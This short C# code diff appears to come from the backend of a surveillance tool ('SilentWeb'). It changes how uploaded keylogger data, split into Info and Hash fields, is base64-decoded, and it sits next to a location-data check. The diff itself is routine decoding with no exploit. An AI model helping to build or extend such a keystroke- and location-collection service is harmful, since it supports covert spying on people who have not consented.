@@ -32,7 +32,8 @@ namespace SilentWeb.Services
 
                 if (DataChecker.CheckKeylogger(bulkData.Keylogger))
                 {
-                    bulkData.Keylogger = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger)));
+                    bulkData.Keylogger.Info = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger.Info)));
+                    bulkData.Keylogger.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger.Hash)));
                 }
 
                 if (DataChecker.CheckLocation(bulkData.Location))
